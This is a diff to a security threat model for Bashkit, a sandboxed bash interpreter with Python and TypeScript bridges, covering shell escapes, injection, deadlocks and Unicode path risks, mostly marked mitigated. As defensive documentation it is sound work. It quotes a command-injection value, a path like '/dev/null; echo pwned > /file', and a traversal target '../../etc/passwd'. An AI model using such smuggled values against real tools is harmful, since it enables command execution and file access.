@@ -1723,6 +1406,14 @@ yield `OsCall` events that Bashkit intercepts and dispatches to the VFS.
 | TM-PY-004 | Shell escape via os.system/subprocess | Critical | Monty has no os.system/subprocess implementation | `threat_python_no_os_operations` |
 | TM-PY-005 | Real filesystem access via open() | Critical | VFS bridge opens only Bashkit VFS files, not host files | `threat_python_no_filesystem` |
 | TM-PY-006 | Error info leakage via stdout | Medium | Errors go to stderr, not stdout | `threat_python_error_isolation` |
+| TM-PY-007 | Silent failure masks malicious script errors | Low | Syntax errors return non-zero exit code | `threat_python_syntax_error_exit` |
+| TM-PY-008 | Exit-code spoofing across the python/bash boundary | Low | `sys.exit(N)` propagates N to bash `$?` | `threat_python_exit_code_propagation` |
+| TM-PY-009 | Degenerate input (`-c ''`) crashes the builtin | Low | Empty code fails gracefully with an error | `threat_python_empty_code` |
+| TM-PY-010 | Error text leaks into pipeline data | Medium | Pipeline consumers receive stdout only; tracebacks stay on stderr | `threat_python_pipeline_error_handling` |
+| TM-PY-011 | Command substitution captures stderr diagnostics | Medium | `$(python ...)` captures stdout only | `threat_python_subst_captures_stdout` |
+| TM-PY-012 | Shell escape via Python `eval`/`exec` | Critical | Monty has no `os.system`/`subprocess`; eval'd code stays inside the interpreter | `threat_python_no_shell_exec` |
+| TM-PY-013 | Unknown CLI options smuggle behavior | Low | Unknown `python` options rejected with exit 2 | `threat_python_unknown_options` |
+| TM-PY-014 | Python escapes Bashkit resource limits | High | Bashkit `ExecutionLimits` apply to the `python` command like any builtin | `threat_python_respects_bash_limits` |
 | TM-PY-015 | Real filesystem read via pathlib | Critical | VFS bridge reads only from Bashkit VFS, not host | `threat_python_vfs_no_real_fs` |
 | TM-PY-016 | Real filesystem write via pathlib | Critical | VFS bridge writes only to Bashkit VFS | `threat_python_vfs_write_sandboxed` |
 | TM-PY-017 | Path traversal (../../etc/passwd) | High | VFS resolves paths within sandbox boundaries | `threat_python_vfs_path_traversal` |
@@ -1735,35 +1426,26 @@ yield `OsCall` events that Bashkit intercepts and dispatches to the VFS.
 | TM-PY-024 | Heredoc content injection | High | `deepagents.py` write() builds a per-call random delimiter (`BASHKIT_EOF_<hex>` via `secrets.token_hex(8)`), so content containing the literal `BASHKIT_EOF` cannot terminate the heredoc | **MITIGATED** |
 | TM-PY-025 | GIL deadlock in execute_sync | High | `execute_sync()` calls `rt.block_on()` without releasing GIL; tool callbacks reacquire GIL | **MITIGATED** |
 
-**TM-PY-023**: `crates/bashkit-python/bashkit/deepagents.py` constructs shell commands via f-string
-interpolation of user-supplied paths/content (lines 187, 198, 206, 230, 258, 278, 302). Paths
-like `/dev/null; echo pwned > /file` execute injected commands. Fix: use `shlex.quote()` or
-expose direct VFS methods.
-
-**TM-PY-024**: The `write()` method uses `cat > {file_path} << 'BASHKIT_EOF'\n{content}\nBASHKIT_EOF`.
-Content containing `BASHKIT_EOF` on its own line terminates the heredoc early, executing remaining
-text as shell commands. Fix: random delimiter suffix or direct write API.
+**TM-PY-023 / TM-PY-024** (mitigated): `crates/bashkit-python/bashkit/deepagents.py` built shell
+commands via f-string interpolation, so a path like `/dev/null; echo pwned > /file` injected
+commands, and heredoc content containing `BASHKIT_EOF` terminated `write()`'s heredoc early.
+Fixed per the table rows (`shlex.quote` everywhere; per-call random heredoc delimiter).
 
 **TM-PY-025** (mitigated): every blocking-on-tokio entry point in
-`crates/bashkit-python/src/lib.rs` now wraps the `rt.block_on(...)` call with
-`Python::allow_threads(...)` (see `execute_sync`, `reset`, `snapshot`, and the
-`BashTool` equivalents). Tool callbacks that re-enter Python no longer race the
-caller's GIL hold.
+`crates/bashkit-python/src/lib.rs` (`execute_sync`, `reset`, `snapshot`, and `BashTool`
+equivalents) wraps `rt.block_on(...)` in `Python::allow_threads(...)`, so tool callbacks
+re-entering Python no longer race the caller's GIL hold.
 
 | TM-PY-026 | reset() discards security config | `BashTool.reset()` creates new `Bash` with bare builder, dropping all configured limits | `PyBash::reset` and `BashTool::reset` rebuild via `replace_live_bash_with_builder` + `build_live_builder`, which preserves the original limits, env, and registered builtins | **MITIGATED** |
 | TM-PY-027 | Unbounded recursion in JSON conversion | `py_to_json`/`json_to_py` recurse without depth limit on nested dicts/lists | `json_to_py_inner`, `py_to_json_inner`, and the MontyObject converters all carry a `depth` arg; depth > `MAX_NESTING_DEPTH = 64` raises `ValueError("… nesting depth exceeds maximum of 64")` | **MITIGATED** |
 | TM-PY-030 | GIL deadlock / exit crash via async-callback private loop | Private-loop dispatch blocked on a rendezvous channel while attached (GIL held); pyclass dealloc joined in-flight blocking tasks that must re-attach to finish (froze the whole process, observed as a 6 h CI hang); worker thread attached during interpreter finalization to close its loop (SIGABRT at process exit) | Deterministic teardown protocol: dispatch detaches around send/receive; in-flight callbacks are cancelled and workers/runtime joined with the GIL released while the interpreter is alive; once the atexit-set exit flag flips, threads skip Python and the OS reclaims resources | **MITIGATED** |
 
-**TM-PY-026** (mitigated): `PyBash::reset` and `BashTool::reset` (`crates/bashkit-python/src/lib.rs`)
-rebuild the inner `Bash` via `replace_live_bash_with_builder` + `build_live_builder`, which
-re-applies the original limits, env, and registered builtins. Regression tests:
+**TM-PY-026** (mitigated): see table. Regression tests:
 `tests/test_python_security.py::test_bash_reset_preserves_limits`,
 `…test_bashtool_reset_preserves_limits`.
 
-**TM-PY-027** (mitigated): `json_to_py_inner`, `py_to_json_inner`, and the corresponding
-MontyObject converters in `crates/bashkit-python/src/lib.rs` carry a `depth: usize` argument.
-At `depth > MAX_NESTING_DEPTH = 64`, conversion raises a Python `ValueError` instead of
-recursing. Coverage: `tests/_security_advanced.py::JsonConversionBoundariesTests`.
+**TM-PY-027** (mitigated): see table. Coverage:
+`tests/_security_advanced.py::JsonConversionBoundariesTests`.
 
 **TM-PY-030** (mitigated): three crash/deadlock variants in the async-callback
 private-loop machinery (`crates/bashkit-python/src/lib.rs`), resolved by a
@@ -1833,28 +1515,12 @@ filesystem.
 
 ### Supported OsCall Operations
 
-| Operation | VFS Method | Return Type |
-|-----------|-----------|-------------|
-| Path.exists() | fs.exists() | bool |
-| Path.is_file() | fs.stat() | bool |
-| Path.is_dir() | fs.stat() | bool |
-| Path.is_symlink() | fs.stat() | bool |
-| open(), Path.open() | fs.stat() / fs.write_file() | file handle |
-| Path.read_text() | fs.read_file() | str |
-| Path.read_bytes() | fs.read_file() | bytes |
-| Path.write_text() | fs.write_file() | int |
-| Path.write_bytes() | fs.write_file() | int |
-| file.write() append mode | fs.read_file() + fs.write_file() | int |
-| Path.mkdir() | fs.mkdir() | None |
-| Path.unlink() | fs.remove() | None |
-| Path.rmdir() | fs.remove() | None |
-| Path.iterdir() | fs.read_dir() | list[Path] |
-| Path.stat() | fs.stat() | stat_result |
-| Path.rename() | fs.rename() | Path |
-| Path.resolve() | identity (no symlink resolution) | Path |
-| Path.absolute() | identity (no symlink resolution) | Path |
-| os.getenv() | ctx.env lookup | str/None |
-| os.environ | ctx.env dict | dict |
+All bridged to VFS methods: `Path.exists/is_file/is_dir/is_symlink/stat` → `fs.stat()`/`fs.exists()`;
+`open()`, `Path.open/read_text/read_bytes/write_text/write_bytes` and append-mode writes →
+`fs.read_file()`/`fs.write_file()`; `Path.mkdir` → `fs.mkdir()`; `Path.unlink/rmdir` →
+`fs.remove()`; `Path.iterdir` → `fs.read_dir()`; `Path.rename` → `fs.rename()`;
+`Path.resolve/absolute` → identity (no symlink resolution); `os.getenv`/`os.environ` →
+`ctx.env` (never host env).
 
 ---
 
@@ -1885,13 +1551,9 @@ VM, Bashkit intercepts and dispatches to the VFS, then resumes execution.
 
 ### Opt-in Design
 
-TypeScript execution requires **two explicit opt-in steps**:
-
-1. **Cargo feature flag**: `features = ["typescript"]` — compiles zapcode-core
-2. **Builder registration**: `.typescript()` — registers ts/node/deno/bun commands
-
-Without step 1, the dependency is not compiled. Without step 2, the commands
-are not available even if compiled. This matches the Python builtin pattern.
+TypeScript execution requires two explicit opt-in steps, matching the Python builtin pattern:
+(1) Cargo feature `typescript` (compiles zapcode-core) and (2) builder registration
+`.typescript()` (registers ts/node/deno/bun). Without both, the commands are unavailable.
 
 ### Threats
 
@@ -1938,27 +1600,16 @@ ZapCode blocks these at the language level (not just runtime):
 
 ### VFS Bridge Security Properties
 
-1. **No real filesystem access**: All VFS-bridged functions go through Bashkit's
-   VFS. `/etc/passwd` in TypeScript reads from VFS, not the host.
-2. **Shared VFS with bash**: Files written by `echo > file` are readable by
-   TypeScript's `readFile()`, and vice versa. This is intentional.
-3. **Path resolution**: Relative paths are resolved against the shell's cwd.
-   Path traversal (`../..`) is constrained by VFS path normalization.
-4. **Error handling**: VFS errors return error strings to TypeScript, not panics.
-5. **Resource isolation**: ZapCode's own limits (time, memory, stack, allocations)
-   are enforced independently of Bashkit's shell limits.
+Same five properties as the Python VFS bridge (see TM-PY section): no real filesystem access,
+intentionally shared VFS with bash, cwd-relative path resolution constrained by VFS
+normalization, errors returned as strings (not panics), and ZapCode's own resource limits
+(time, memory, stack, allocations) enforced independently of Bashkit's shell limits.
 
 ### Supported VFS Operations
 
-| Operation | External Function | Return Type |
-|-----------|------------------|-------------|
-| Read file | readFile(path) | string |
-| Write file | writeFile(path, content) | undefined |
-| Check existence | exists(path) | boolean |
-| List directory | readDir(path) | string[] |
-| Create directory | mkdir(path) | undefined |
-| Delete file/dir | remove(path) | undefined |
-| File metadata | stat(path) | JSON string |
+External functions, all VFS-bridged: `readFile(path) → string`, `writeFile(path, content)`,
+`exists(path) → boolean`, `readDir(path) → string[]`, `mkdir(path)`, `remove(path)`,
+`stat(path) → JSON string`.
 
 ### Known Limitation
 
@@ -2062,54 +1713,14 @@ to APIs expecting **character indices** (`.chars().nth()`) or uses them where ch
 counting is needed. For ASCII this is coincidentally correct. For multi-byte UTF-8 (2–4
 bytes per char), character position N does not equal byte offset N.
 
-**Affected Code**:
-
-*awk.rs (50+ instances — CRITICAL):*
-```
-Line 449:  self.input[start..self.pos].to_string()     // read_identifier
-Line 453:  self.input[self.pos..].starts_with(keyword)  // matches_keyword
-Line 1532: self.input[start..self.pos].to_string()      // parse_primary
-Line 1596: self.input[start..self.pos]                   // parse_number
-Lines 397-1564: 69 instances of .chars().nth(pos) where pos is byte offset
-Lines 1006-1430: ~10 operator checks using self.input[self.pos..]
-```
-
-*sed.rs (14 instances):*
-```
-Lines 293-299: split_sed_commands() — chars().enumerate() index as byte offset
-Lines 376-382: parse_address() — byte offset arithmetic
-Lines 455, 458: parse_sed_command() — .nth(1) + [2..] assumes single-byte
-Lines 547-566: commands a/i/c — .len() > 1 checked but .chars().nth(1) may fail
-Lines 574-609: rest[1..] assumes single-byte first char
-```
-
-*expr.rs (3 instances):*
-```
-Line 46:  args[1].len() — returns bytes, used as character count for `length`
-Line 57:  pos > s.len() — byte length used as character position bound
-Line 62:  s[start..end] — char positions (1-based user input) used as byte indices
-```
-
-*printf.rs (1 instance):*
-```
-Line 165: &s[..s.len().min(prec)] — prec may land mid-character
-```
-
-*cuttr.rs (expand_char_set):*
-```
-Lines 405-410: as_bytes() iteration — all non-ASCII chars treated as individual bytes
-Line 410: spec[i + 2..].find(":]") byte offset mixed with byte-based slicing (safe for ASCII class names but fragile)
-```
-
-*interpreter/mod.rs:*
-```
-Lines 1520, 1524: expr.chars().nth(eq_pos ± 1) where eq_pos from .find('=') is byte offset
-```
-
-*network/allowlist.rs:*
-```
-Line 194: url_path.chars().nth(pattern_path.len()) — byte count used as char index
-```
+**Affected Code** (file:line-range pointers; same byte-vs-char confusion in each):
+- `awk.rs` — 50+ instances, CRITICAL: identifier/keyword/number slicing at 449, 453, 1532, 1596; ~69 `.chars().nth(byte_offset)` calls across 397-1564; ~10 operator checks on `self.input[self.pos..]` across 1006-1430
+- `sed.rs` — 14 instances: `split_sed_commands` 293-299, `parse_address` 376-382, `parse_sed_command` 455/458, commands a/i/c 547-566, `rest[1..]` single-byte assumptions 574-609
+- `expr.rs` — 46 (`.len()` as char count), 57 (byte length as position bound), 62 (char positions as byte slice indices)
+- `printf.rs` — 165 (`&s[..s.len().min(prec)]` may land mid-character)
+- `cuttr.rs` — 405-410 (`expand_char_set` byte iteration; `find(":]")` byte offset, safe for ASCII class names but fragile)
+- `interpreter/mod.rs` — 1520, 1524 (`.chars().nth()` fed byte offsets from `.find('=')`)
+- `network/allowlist.rs` — 194 (`url_path.chars().nth(pattern_path.len())`, byte count as char index)
 
 **Fix Pattern**: Convert all byte/char-confused code to use one of:
 1. `char_indices()` iteration — returns `(byte_offset, char)` pairs
@@ -2130,16 +1741,9 @@ The `logging_impl.rs:truncate()` function demonstrates the correct pattern using
 **Current Risk**: LOW for filenames (path validation gap), MINIMAL for variables/scripts
 (correct pass-through behavior matches Bash)
 
-**Zero-width characters of concern**:
-- U+200B Zero Width Space (ZWSP)
-- U+200C Zero Width Non-Joiner (ZWNJ)
-- U+200D Zero Width Joiner (ZWJ)
-- U+FEFF Byte Order Mark / Zero Width No-Break Space
-- U+2060 Word Joiner
-- U+180E Mongolian Vowel Separator
-
 **Status**: TM-UNI-003 is **MITIGATED**. `find_unsafe_path_char()` (`crates/bashkit/src/fs/limits.rs`)
-rejects U+200B-U+200D, U+2060, U+FEFF, and U+180E in path components. Variable names and
+rejects the zero-width set U+200B (ZWSP), U+200C (ZWNJ), U+200D (ZWJ), U+2060 (Word Joiner),
+U+FEFF (BOM/ZWNBSP), U+180E (Mongolian Vowel Separator) in path components. Variable names and
 script content still pass through as-is to match Bash behavior (TM-UNI-004, TM-UNI-005).
 
 ### 11.3 Homoglyph / Confusable Characters
@@ -2187,17 +1791,12 @@ real Bash on Linux.
 | TM-UNI-012 | Interlinear annotation hiding | U+FFF9-U+FFFB (Interlinear Annotations) — can hide text in filenames | `find_unsafe_path_char()` rejects U+FFF9-U+FFFB in path components | **MITIGATED** |
 | TM-UNI-013 | Deprecated format chars | U+206A-U+206F (Deprecated formatting) — can cause display confusion | `find_unsafe_path_char()` rejects U+206A-U+206F in path components | **MITIGATED** |
 
-**Status**: All three are **MITIGATED**. `find_unsafe_path_char()` rejects every
-documented invisible/confusable range in path components:
-- U+200B-U+200D, U+2060, U+FEFF, U+180E (zero-width, TM-UNI-003)
-- U+202A-U+202E, U+2066-U+2069 (bidi overrides, TM-DOS-015)
-- U+206A-U+206F (deprecated format, TM-UNI-013)
-- U+FFF9-U+FFFB (interlinear annotations, TM-UNI-012)
-- U+E0000-U+E007F (tag block, TM-UNI-011)
-
-Variable names, script content, and command output are unaffected — pass-through there
-matches Bash behavior. Caller-side display sanitization (see Caller Responsibilities)
-remains useful defense-in-depth.
+**Status**: All three are **MITIGATED**. `find_unsafe_path_char()` rejects every documented
+invisible/confusable range in path components: zero-width (TM-UNI-003), bidi overrides
+U+202A-U+202E / U+2066-U+2069 (TM-DOS-015), deprecated format U+206A-U+206F (TM-UNI-013),
+interlinear annotations U+FFF9-U+FFFB (TM-UNI-012), tag block U+E0000-U+E007F (TM-UNI-011).
+Variable names, script content, and command output pass through unaffected (matches Bash);
+caller-side display sanitization remains useful defense-in-depth.
 
 ### 11.7 Bidi in Script Source
 
@@ -2227,66 +1826,22 @@ character indices are expected, or vice versa.
 | TM-UNI-018 | Interpreter arithmetic | `((αβγ=1))` — `find('=')` byte offset passed to `.chars().nth()` | Byte offset from `.find()` used as char index; wrong char inspected | **PARTIAL** |
 | TM-UNI-019 | Network allowlist | `allow("https://example.com/données/")` — byte length as char index | `pattern_path.len()` (bytes) → `url_path.chars().nth(bytes)` | **PARTIAL** |
 
-**Affected Code (expr.rs)**:
-```
-Line 46:  args[1].len().to_string()      // bytes, not char count
-Line 57:  pos > s.len()                   // byte length as char position bound
-Line 62:  s[start..end].to_string()       // char positions used as byte indices → PANIC
-```
-
-**Affected Code (printf.rs)**:
-```
-Line 165: &s[..s.len().min(prec)]         // prec may land mid-char → PANIC
-```
-
-**Affected Code (cuttr.rs)**:
-```
-Lines 405-410: as_bytes() iteration        // multi-byte chars split into individual bytes
-Line 410: spec[i + 2..].find(":]")         // byte offset (safe for ASCII class names)
-```
-
-**Affected Code (interpreter/mod.rs)**:
-```
-Line 1517: expr.find('=')                  // returns byte offset
-Line 1520: expr.chars().nth(eq_pos - 1)    // byte offset treated as char index
-Line 1524: expr.chars().nth(eq_pos + 1)    // same confusion
-```
-
-**Affected Code (network/allowlist.rs)**:
-```
-Line 194: url_path.chars().nth(pattern_path.len())  // byte count as char index
-```
+**Affected Code**: same locations as the per-file pointers in §11.1 — `expr.rs:46,57,62`
+(panic risk), `printf.rs:165` (panic risk), `cuttr.rs:405-410`, `interpreter/mod.rs:1517-1524`,
+`network/allowlist.rs:194`.
 
 **Risk Assessment**: MEDIUM for expr/printf (panic risk on valid input, caught by
 `catch_unwind`). LOW-MEDIUM for allowlist (incorrect allow/deny on multi-byte URL paths,
 no panic). LOW for interpreter arithmetic and cut/tr (multi-byte variable names and tr
 specs are rare in practice).
 
-**Safe Components** (confirmed by audit):
-- **Lexer** (`parser/lexer.rs`): Uses `Chars` iterator; `Position::advance()` correctly
-  uses `ch.len_utf8()` for byte offset tracking
-- **wc** (`builtins/wc.rs`): Correctly uses `.len()` for bytes and `.chars().count()`
-  for characters
-- **grep** (`builtins/grep.rs`): Delegates to regex crate which handles Unicode correctly
-- **jq** (`builtins/jq/`): Delegates to jaq crate
-- **sort/uniq** (`builtins/sort_uniq.rs`): String comparison-based, no byte indexing
-- **logging** (`logging_impl.rs`): Uses `is_char_boundary()` correctly
-- **python** (`builtins/python.rs`): Shebang strip uses `find('\n')` — newline is ASCII,
-  byte offset safe. No other byte/char manipulation.
-- **Python bindings** (`bashkit-python/src/lib.rs`): PyO3 `String` extraction handles
-  UTF-8 correctly. No manual byte/char manipulation patterns.
-- **eval harness** (`bashkit-eval/src/`): Only uses `Iterator::find` (not `str::find`),
-  `chars().take()` for display truncation, `from_utf8_lossy()` for file content. All safe.
-- **curl** (`builtins/curl.rs`): All `.find()` calls use ASCII delimiters (`:`, `=`).
-  Byte offsets are safe because delimiters are single-byte.
-- **bc** (`builtins/bc.rs`): `find('=')` with ASCII delimiter. Safe.
-- **export** (`builtins/export.rs`): `find('=')` with ASCII delimiter. Safe.
-- **date** (`builtins/date.rs`): `&fmt[1..]` strips ASCII `+`. Safe.
-- **comm** (`builtins/comm.rs`): `arg[1..]` strips ASCII `-`. Safe.
-- **echo** (`builtins/echo.rs`): `arg_str[1..]` strips ASCII `-`. Safe.
-- **archive** (`builtins/archive.rs`): `arg[1..]` strips ASCII `-`. Safe.
-- **base64** (`builtins/base64.rs`): `s[7..]` after `starts_with("--wrap=")` — 7 ASCII bytes. Safe.
-- **scripted_tool** (`scripted_tool/`): No byte/char patterns found.
+**Safe Components** (confirmed by audit): lexer (`parser/lexer.rs`, `Chars` iterator +
+`ch.len_utf8()` offsets); wc (`.len()`/`.chars().count()` used correctly); grep (regex crate);
+jq (jaq crate); sort/uniq (comparison-based, no byte indexing); logging (`logging_impl.rs`,
+`is_char_boundary()`); python builtin + Python bindings (PyO3 UTF-8 handling, only ASCII
+`find('\n')`); eval harness (`Iterator::find`, `chars().take()`, `from_utf8_lossy()`);
+curl/bc/export/date/comm/echo/archive/base64 (`.find()`/slicing only on single-byte ASCII
+delimiters); scripted_tool (no byte/char patterns).
 
 ### Unicode Security Summary
 
